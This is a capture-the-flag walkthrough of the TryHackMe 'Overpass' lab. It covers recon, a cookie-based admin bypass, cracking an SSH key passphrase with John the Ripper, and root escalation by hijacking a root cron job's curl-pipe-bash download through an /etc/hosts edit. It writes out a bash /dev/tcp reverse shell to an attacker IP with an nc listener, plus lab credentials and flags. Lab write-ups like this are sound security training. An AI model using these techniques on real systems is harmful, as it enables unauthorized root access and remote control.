# TryHackMe - Overpass


## 🛠 Reco

Set an environment variable for the IP to simplify commands:

```bash
export IP=10.10.208.137
```

### 🔍 Nmap Scan

```bash
nmap -sC -sV -oN nmap/initial $IP
```

** Results: **

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                 
| ssh-hostkey:                                                           
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 🔍 Gobuster

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.208.137 -x .php,.txt,.html,.js,.md | tee go_scan

```

** Results: **
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 301) [Size: 0] [--> ./]
/img                  (Status: 301) [Size: 0] [--> img/]
/login.js             (Status: 200) [Size: 1779]
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/main.js              (Status: 200) [Size: 28]
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
/admin                (Status: 301) [Size: 42] [--> /admin/]
/admin.html           (Status: 200) [Size: 1525]
/css                  (Status: 301) [Size: 0] [--> css/]
/404.html             (Status: 200) [Size: 782]
/cookie.js            (Status: 200) [Size: 1502]
```

There is an about-us page. These might be the usernames!
```
Ninja - Lead Developer
Pars - Shibe Enthusiast and Emotional Support Animal Manager
Szymex - Head Of Security
Bee - Chief Drinking Water Coordinator
MuirlandOracle - Cryptography Consultant
```


## 📌 Task 1: Hack the machine and get the flag in user.txt

### Initial foothold

There is an admin page that calls login.js

Looking at login.js there seems to be a check for a cookie. If it's correct then it bypasses the login page. 
```
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
```

So we all we need to do is access the /admin/ page with the cookie set. It doesn't seem to matter what the cookie is set to.

If we open developer mode (F12) and go to the storage section we can add in our fake cookie!

```
Go to storage
click the plus to add in a new value
Change the name to "SessionToken" and choose any vaue
hit fresh on the page!
```
It worked! We're now presented with an SSH private key for james (from paradox). Let's see if we can SSH in.

```bash
<create a file called id_rsa and paste in the contents from the page>
chmod 600 id_rsa
ssh -i id_rsa james@10.10.208.137
```

**Results:**
```
The authenticity of host '10.10.208.137 (10.10.208.137)' can't be established.
ED25519 key fingerprint is SHA256:FhrAF0Rj+EFV1XGZSYeJWf5nYG0wSWkkEGSO5b+oSHk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.208.137' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
```

Nope it has a passphrase. That can easily be cracked with John the ripper

```bash
ssh2john id_rsa > john_rsa
john john_rsa --wordlist=/usr/share/wordlists/rockyou.txt
```

**Results:**
```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (id_rsa)     
1g 0:00:00:00 DONE (2025-07-13 12:09) 50.00g/s 668800p/s 668800c/s 668800C/s pink25..honolulu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
so his ssh private key has a passphrase of "james13"
```bash
ssh -i id_rsa james@10.10.208.137
```

That worked. I am in as john. Let's cat the user flag

**Q. Hack the machine and get the flag in user.txt
A. thm{65c1aaf000506e56996822c6281e6bf7}


## Excalate to root

```
Things to try

1. sudo -l
2. suid files
3. cron jobs
4. random password files
```

### 1. sudo -l

Nope it asked for a password. I did run the overpass test utility and to export all passwords. A password was provided!. However, this is not the root password but the one for james. I tried using the password and it worked but we're not in the sudoers group.

```
Password for Jaames: saydrawnlyingpicture
```

### 2. suid files

Next, I looked for suid files.

```bash
find / -type f -perm -u=s 2>/dev/null
```

**Results:**
```
/bin/fusermount
/bin/umount
/bin/su
/bin/mount
/bin/ping
/usr/bin/chfn
/usr/bin/at
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

Nothing worth mentioning here :-(

### 3. cronjobs

I uploaded pspy32 using a python web server on my attacker pc. This found a reapeating running process that runs as root. This is interesting. It downloads a script and runs it - all as root!

**Results:**
```
/bin/sh -c curl overpass.thm/downloads/src/buildscript.sh | bash
```
where does overpass.thm resolve to?

```bash
ping overpass.thm
```

**Results:**
```
PING overpass.thm (127.0.0.1) 56(84) bytes of data.
64 bytes from overpass.thm (127.0.0.1): icmp_seq=1 ttl=64 time=0.013 ms
```

So it's just the loopback address. Let's curl the file and see what's in it.

```bash
curl overpass.thm/downloads/src/buildscript.sh
```

**Results:**
```
cat buildscript.sh 
GOOS=linux /usr/local/go/bin/go build -o ~/builds/overpassLinux ~/src/overpass.go
## GOOS=windows /usr/local/go/bin/go build -o ~/builds/overpassWindows.exe ~/src/overpass.go
## GOOS=darwin /usr/local/go/bin/go build -o ~/builds/overpassMacOS ~/src/overpass.go
## GOOS=freebsd /usr/local/go/bin/go build -o ~/builds/overpassFreeBSD ~/src/overpass.go
## GOOS=openbsd /usr/local/go/bin/go build -o ~/builds/overpassOpenBSD ~/src/overpass.go
echo "$(date -R) Builds completed" >> /root/buildStatus
```

I cannot access the file so I can't change it. Perhaps I can trick the server to use my attacker pc instead of using localhost for overpass.thm?

## Excalate to root

This is the plan. 

I'll create a web server on my attacker PC on port 80. This will server the script buildscript.sh. However, it'll be my version of the script which is just a revershell. I'll then create nc listener on my attacker PC. 
The final step will be to edit the server's hosts file and change from the loopback address to my attacker machine.

What should happen is the server will connect to my attacker PC on port 80. Download and run my version of the script. Executing a reverse shell back to my attacker PC as root!

### Step 1 - Create the files and web server on my attacker PC
```bash
mkdir -p downloads/src
echo "bash -i >& /dev/tcp/10.6.57.243/9999 0>&1" > downloads/src/buildscript.sh
chmod +x downloads/src/buildscript.sh
python -m http.server 80
```

### Step 2 - Listener on my attacker PC
```bash
rlwrap nc -nlvp 9999
```

### Step 3 - Change the host file on the server to point to my attacker PC

```bash
nano /etc/hosts
```
wait for it! BINGO. We're root!

```bash
cat /root/root.txt
thm{7f336f8c359dbac18d54fdd64ea753bb}
```

**Q. Escalate your privileges and get the flag in root.txt
A. thm{7f336f8c359dbac18d54fdd64ea753bb}


